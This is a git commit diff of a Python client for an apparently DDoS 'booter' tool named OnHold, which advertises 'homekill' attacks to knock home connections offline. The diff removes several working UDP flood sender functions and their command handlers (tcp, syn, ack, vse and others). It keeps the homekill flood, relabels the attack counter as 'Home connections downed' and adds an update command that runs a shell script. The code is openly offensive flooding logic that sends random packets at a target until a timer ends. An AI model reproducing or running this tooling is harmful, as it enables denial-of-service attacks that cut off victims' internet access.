ca109cafddd653d56fc80cf739110a0dd80207fc
D3fe4ted <73515265+d3fe4ted@users.noreply.github.com>
2022-02-02 18:36:05 -0800

    Update client.c

--- client.c
+++ client.c
@@ -9,24 +9,6 @@ import threading
 import getpass
 import os
 
-welcome = """
-\033[31m╔════════════════════════════════════════════════════════════════╗
-\033[31m║                         \033[00mWelcome to \033[31mOn\033[00mHold!                     \033[31m║
-\033[31m║\033[01;97m                   [+] Rules and Information [+]                \033[31m║
-\033[31m║[+]==========================================================[+]║
-\033[31m║\033[01;97m   ----------- * Attacks tested and work * -----------          \033[31m║
-\033[31m║\033[01;97m   ------------- * Created by D3fe4ted * -------------          \033[31m║
-\033[31m║\033[01;97m   ----------- Press ENTER 2x to continue ------------          \033[31m║
-\033[31m╠═══════════════════════════════╦════════════════════════════════╣
-\033[31m║\033[00m         [+] Info [+]          \033[31m║\033[01;97m          [+] Rules [+]         \033[31m║
-\033[31m║                               \033[31m║\033[01;97m                                \033[31m║
-\033[31m║[+]=========================[+]\033[31m║\033[01;31m[+]==========================[+]\033[31m║
-\033[31m║\033[01;97m   - Added this welcome menu   \033[31m║\033[01;97m     No Skidripping/Skidding!   \033[31m║
-\033[31m║\033[01;97m - New methods check them out  \033[31m║\033[01;97m        No hitting the Gov!     \033[31m║
-\033[31m║                               \033[31m║\033[01;97m                                \033[31m║
-\033[31m╚═══════════════════════════════╩════════════════════════════════╝
-"""
-
 banner = """
                         \033[31m╔═╗╔╗╔╦ ╦\033[37m╔═╗╦  ╔╦╗            
                         \033[31m║ ║║║║╠═╣\033[37m║ ║║   ║║            
@@ -34,7 +16,13 @@ banner = """
                    ☎️  \033[31mPut those m\033[37mfs on hold ☎️
             \033[31m╔════════════════════════════════════════╗
             \033[31m║   \033[37mhomekill {ip} {port} {time} {2048}   \033[31m║
-            \033[31m╚════════════════════════════════════════╝
+            \033[31m║    ╔══════════════════════════════╗    \033[31m║
+            \033[31m╚════╣        Dashboard Help        ╠════╝
+                 \033[31m║  \033[37mStop - Stops All Attacks    \033[31m║
+                 \033[31m║  \033[37mClear - Clears Terminal     \033[31m║
+                 \033[31m║  \033[37mUpdate - Updates \033[31mOn\033[37mHold     \033[31m║
+                 \033[31m║  \033[37mExit - Exits OnHold         \033[31m║
+                 \033[31m╚══════════════════════════════╝
 """
 
 fsubs = True
@@ -71,127 +59,6 @@ def udpsender(host, port, timer, punch):
 	uaid -= 10000000
 	aid -= 10000000
 
-def tcpsender(host, port, timer, punch):
-	global uaid
-	global ddosgaurd
-	global aid
-	global tattacks
-
-	timeout = time.time() + float(timer)
-	sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-	
-	uaid += 10000000
-	aid += 10000000
-	tattacks += 10000000
-	while time.time() < timeout and tcp and attack:
-		sock.sendto(punch, (host, int(port)))
-	uaid -= 10000000
-	aid -= 10000000
-
-def randsender(host, timer, port, punch):
-	global iaid
-	global aid
-	global tattacks
-	global running
-
-	timeout = time.time() + float(timer)
-	sock = socket.socket(socket.AF_INET, socket.IPPROTO_IGMP)
-
-	iaid += 1
-	aid += 1
-	tattacks += 1
-	running += 1
-	while time.time() < timeout and ldap and attack:
-		sock.sendto(punch, (host, int(port)))
-	running -= 1
-	iaid -= 1
-	aid -= 1
-
-def synsender(host, port, timer, punch):
-	global uaid
-	global ddosgaurd
-	global aid
-	global tattacks
-
-	timeout = time.time() + float(timer)
-	sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-	
-	uaid += 10000000
-	aid += 10000000
-	tattacks += 10000000
-	while time.time() < timeout and syn and attack:
-		sock.sendto(punch, (host, int(port)))
-	uaid -= 10000000
-	aid -= 10000000
-  
-def acksender(host, port, timer, punch):
-	global uaid
-	global ddosgaurd
-	global aid
-	global tattacks
-
-	timeout = time.time() + float(timer)
-	sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-	
-	uaid += 10000000
-	aid += 10000000
-	tattacks += 10000000
-	while time.time() < timeout and ack and attack:
-		sock.sendto(punch, (host, int(port)))
-	uaid -= 10000000
-	aid -= 10000000
-
-def dnssender(host, port, timer, punch):
-	global uaid
-	global ddosgaurd
-	global aid
-	global tattacks
-
-	timeout = time.time() + float(timer)
-	sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-	
-	uaid += 10000000
-	aid += 10000000
-	tattacks += 10000000
-	while time.time() < timeout and dns and attack:
-		sock.sendto(punch, (host, int(port)))
-	uaid -= 10000000
-	aid -= 10000000
-
-def vsesender(host, port, timer, punch):
-	global uaid
-	global ddosgaurd
-	global aid
-	global tattacks
-
-	timeout = time.time() + float(timer)
-	sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-	
-	uaid += 10000000
-	aid += 10000000
-	tattacks += 10000000
-	while time.time() < timeout and std and attack:
-		sock.sendto(punch, (host, int(port)))
-	uaid -= 10000000
-	aid -= 10000000
-
-def stdsender(host, port, timer, punch):
-	global uaid
-	global ddosgaurd
-	global aid
-	global tattacks
-
-	timeout = time.time() + float(timer)
-	sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-	
-	uaid += 10000000
-	aid += 10000000
-	tattacks += 10000000
-	while time.time() < timeout and std and attack:
-		sock.sendto(punch, (host, int(port)))
-	uaid -= 10000000
-	aid -= 10000000
-
 #globals
 def main():
 	global fsubs
@@ -220,7 +87,11 @@ def main():
 			print ("\033[32muser\033[37m@\033[31monh\033[37mold~  You Are Exiting Out Of OnHold Client.\n")
 			exit()
 		elif sinput == "attacks":
-			print ("\033Total Attacks Running: {}\n".format (aid))
+			print ("\033mHome connections downed: {}\n".format (aid))
+			main()
+		elif sinput == "update":
+			os.system ("sh update.sh")
+			print (banner)
 			main()
 		elif sinput == "homekill":
 			if username == "Guest":
@@ -239,80 +110,12 @@ def main():
 				except socket.gaierror:
 					print ("\033[31m[ONH\033[37mOLD] Host: {} Invalid.\n".format (host))
 					main()
-		elif sinput == "tcp":
-			if username == "Guest":
-				print ("\033[31m[ONH\033[37mOLD] You Are Not Allowed To Use This Method.\n")
-				main()
-			else:
-				try:
-					sinput, host, port, timer, pack = sin.split(" ")
-					socket.gethostbyname(host)
-					print ("\033[31m[ONH\033[37mOLD] Attack sent from OnHold Client to {}".format (host))
-					punch = random._urandom(int(pack))
-					threading.Thread(target=tcpsender, args=(host, port, timer, punch)).start()
-				except ValueError:
-					print ("\033[31m[ONH\033[37mOLD] The Command {} Requires An Argument.\n".format (sinput))
-					main()
-				except socket.gaierror:
-					print ("\033[31m[ONH\033[37mOLD] Host: {} Invalid.\n".format (host))
-					main()
 		elif sinput == "stop":
 			print ("\033[31m[ONH\033[37mOLD] All Running Attacks Have Been Stopped.\n")
 			attack = False
 			while not attack:
 				if aid == 0:
 					attack = True
-		elif sinput == "syn":
-			if username == "Guest":
-				print ("\033[31m[ONH\033[37mOLD] You Are Not Allowed To Use This Method.\n")
-				main()
-			else:
-				try:
-					sinput, host, port, timer, pack = sin.split(" ")
-					socket.gethostbyname(host)
-					print ("\033[31m[ONH\033[37mOLD] Attack sent from OnHold Client to {}".format (host))
-					punch = random._urandom(int(pack))
-					threading.Thread(target=synsender, args=(host, port, timer, punch)).start()
-				except ValueError:
-					print ("\033[31m[ONH\033[37mOLD] The Command {} Requires An Argument.\n".format (sinput))
-					main()
-				except socket.gaierror:
-					print ("\033[31m[ONH\033[37mOLD] Host: {} Invalid.\n".format (host))
-					main()
-		elif sinput == "ack":
-			if username == "Guest":
-				print ("\033[31m[ONH\033[37mOLD] You Are Not Allowed To Use This Method.\n")
-				main()
-			else:
-				try:
-					sinput, host, port, timer, pack = sin.split(" ")
-					socket.gethostbyname(host)
-					print ("\033[31m[ONH\033[37mOLD] Attack sent from OnHold Client to {}".format (host))
-					punch = random._urandom(int(pack))
-					threading.Thread(target=acksender, args=(host, port, timer, punch)).start()
-				except ValueError:
-					print ("\033[31m[ONH\033[37mOLD] The Command {} Requires An Argument.\n".format (sinput))
-					main()
-				except socket.gaierror:
-					print ("\033[31m[ONH\033[37mOLD] Host: {} Invalid.\n".format (host))
-					main()
-		elif sinput == "vse":
-			if username == "Guest":
-				print ("\033[31m[ONH\033[37mOLD] You Are Not Allowed To Use This Method.\n")
-				main()
-			else:
-				try:
-					sinput, host, port, timer, pack = sin.split(" ")
-					socket.gethostbyname(host)
-					print ("\033[31m[ONH\033[37mOLD] Attack sent from OnHold Client to {}".format (host))
-					punch = random._urandom(int(pack))
-					threading.Thread(target=vsesender, args=(host, port, timer, punch)).start()
-				except ValueError:
-					print ("\033[31m[ONH\033[37mOLD] The Command {} Requires An Argument.\n".format (sinput))
-					main()
-				except socket.gaierror:
-					print ("\033[31m[ONH\033[37mOLD] Host: {} Invalid.\n".format (host))
-					main()
 		elif sinput == "stop":
 			what = sin.split(" ")[1]
 			if what == "udp":
@@ -323,13 +126,6 @@ def main():
 						print ("\033[31m[ONH\033[37mOLD] No homekill Processes Running.")
 						homekill = True
 						main()
-			if what == "ovh":
-				print ("Stopping All ovhdown Attacks.\n")
-				icmp = False
-				while not ovh:
-					print ("\033[31m[ONH\033[37mOLD] No ovh Processes Running.")
-					udp = True
-					main()
 		else:
 			print ("[\033[31mSkidiot\033[00m] {} isn't a command.".format(sinput))
 			main()
